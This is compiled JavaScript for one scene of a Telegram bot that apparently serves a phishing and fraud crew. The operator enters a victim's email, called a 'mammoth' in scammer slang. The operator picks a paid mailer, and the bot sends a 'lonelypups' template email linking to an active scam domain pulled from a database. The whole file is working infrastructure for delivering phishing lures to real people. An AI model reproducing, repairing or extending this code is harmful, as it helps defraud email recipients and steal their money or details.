"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.sendLonelypupsEmail = exports.composer = void 0;
const grammy_scenes_1 = require("grammy-scenes");
const grammy_1 = require("grammy");
const database_1 = require("../../../database");
const email_1 = require("../../../utils/rassilka/email");
const console_1 = __importDefault(require("console"));
const regex = /private lonelypups send email/g;
exports.composer = new grammy_1.Composer();
exports.composer.callbackQuery(regex, startScene);
async function startScene(ctx) {
    return ctx.scenes.enter('private lonelypups send email');
}
exports.sendLonelypupsEmail = new grammy_scenes_1.Scene('private lonelypups send email');
exports.sendLonelypupsEmail.always().callbackQuery('private lonelypupsamount', async (ctx) => {
    await deleteAllMessages(ctx.session.deleteMessage, ctx);
    ctx.scene.exit();
});
exports.sendLonelypupsEmail.do(async (ctx) => {
    ctx.session.deleteMessage = [];
    const res = await ctx.reply(`🐶 Отправь почту мамонта`, {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('Отмена', 'private lonelypupsamount')
    });
    ctx.session.deleteMessage.push(res.message_id);
    ctx.scene.resume();
});
exports.sendLonelypupsEmail.wait().hears(/.+/g, async (ctx) => {
    ctx.session.smsEmail = { ad: 0, to: undefined, pattern: undefined };
    ctx.session.smsEmail.to = ctx.msg.text;
    const msg = await ctx.reply(`Выбери мейлера`, {
        reply_markup: new grammy_1.InlineKeyboard()
            .text('YourMailer | 5%', 'yourmailer')
            .row()
            .text('Отмена', 'private lonelypupsamount')
    });
    ctx.session.deleteMessage.push(msg.message_id);
    ctx.scene.resume();
});
exports.sendLonelypupsEmail.wait().callbackQuery(/yourmailer/g, async (ctx) => {
    ctx.session.smsEmail.pattern = "lonelypups_EU@!!@2.0";
    const domen = await database_1.domensRepository.findOne({
        where: {
            service: 'lonelypups',
            special: true,
            active: true
        }
    });
    const msg = await ctx.reply(`⏳`);
    if (ctx.callbackQuery.data === 'yourmailer') {
        const response = await (0, email_1.sendEmailYourMailer)(ctx.session.smsEmail.to, ctx.session.smsEmail.pattern, `https://${domen.link}/taxi`, ctx.from.id);
        try {
            await ctx.api.deleteMessage(ctx.chat.id, msg.message_id);
        }
        catch (e) { }
        console_1.default.log(response, 'yourmailer');
        await ctx.reply((response === "The message has been sent")
            ? `✅ Кис-кис, я котик ты котик &lt;3`
            : `⚠️ Не удалось отправить письмо`, {
            reply_markup: {
                inline_keyboard: [
                    [{ text: 'Закрыть', callback_data: 'deleteThisMessage' }]
                ]
            }
        });
    }
    await deleteAllMessages(ctx.session.deleteMessage, ctx);
    return ctx.scene.exit();
});
async function deleteAllMessages(array, ctx) {
    for (const id of array) {
        try {
            await ctx.api.deleteMessage(ctx.chat.id, id).catch();
        }
        catch (e) {
            console_1.default.log(e);
        }
    }
}
